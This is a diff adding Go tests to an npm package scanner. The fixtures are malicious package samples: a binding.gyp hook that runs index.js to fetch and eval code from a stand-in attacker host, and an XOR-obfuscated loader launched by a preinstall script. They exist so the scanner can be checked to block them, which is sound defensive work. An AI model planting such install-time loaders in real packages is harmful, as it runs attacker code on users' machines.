@@ -248,6 +248,41 @@ func TestAnalyzeArtifact_NPMClean(t *testing.T) {
 	}
 }
 
+// Phantom Gyp: no scripts, a root binding.gyp running `<!(node index.js)`, the
+// payload in index.js. The guard must follow the implicit node-gyp hook.
+func TestAnalyzeArtifact_NPMBindingGypReferencedPayloadBlocks(t *testing.T) {
+	tgz := makeTGZ(t, map[string]string{
+		"package/package.json": `{"name":"phantom","version":"1.0.0"}`,
+		"package/binding.gyp":  `{"targets":[{"target_name":"a","sources":["<!(node index.js > /dev/null && echo a.c)"]}]}`,
+		"package/index.js":     `const h=require("https"),cp=require("child_process");h.get("https://evil.example/p",r=>{let b="";r.on("data",c=>b+=c);r.on("end",()=>eval(b))});`,
+	})
+	if v := analyzeArtifact("npm", tgz); !v.Block {
+		t.Fatalf("binding.gyp-launched loader must block, got %+v", v)
+	}
+	benign := makeTGZ(t, map[string]string{
+		"package/package.json": `{"name":"addon","version":"1.0.0"}`,
+		"package/binding.gyp":  `{"targets":[{"target_name":"a","include_dirs":["<!(node -p \"require('node-addon-api').include\")"]}]}`,
+		"package/index.js":     "module.exports = require('./build/Release/a.node');\n",
+	})
+	if v := analyzeArtifact("npm", benign); v.Block || v.Severity != "" {
+		t.Fatalf("benign native addon must not block or warn, got %+v", v)
+	}
+}
+
+// A referenced loader past the 2 MiB per-file cap whose XOR decoder and
+// Function call sit only in the tail (the @7nohe 6.4 MB preinstall shape).
+func TestAnalyzeArtifact_NPMTruncatedXorLoaderBlocks(t *testing.T) {
+	loader := `var k="k";var d="` + strings.Repeat("Q", 3*artifactmap.PerFileCap) +
+		`";var o="";for(var i=0;i<d.length;i++){o+=String.fromCharCode(d.charCodeAt(i)^k.charCodeAt(0))}Function(o)();`
+	tgz := makeTGZ(t, map[string]string{
+		"package/package.json":   `{"name":"xor","version":"1.0.0","scripts":{"preinstall":"node 3FWCvzduYZg.js"}}`,
+		"package/3FWCvzduYZg.js": loader,
+	})
+	if v := analyzeArtifact("npm", tgz); !v.Block {
+		t.Fatalf("tail-only XOR loader must block, got %+v", v)
+	}
+}
+
 func TestAnalyzeArtifact_NPMReferencedDependencyMutationWarns(t *testing.T) {
 	tgz := makeTGZ(t, map[string]string{
 		"package/package.json": `{"name":"html-to-gutenberg","version":"4.2.10","scripts":{"postinstall":"node ./scripts/patch-fetch-page-assets.mjs"}}`,
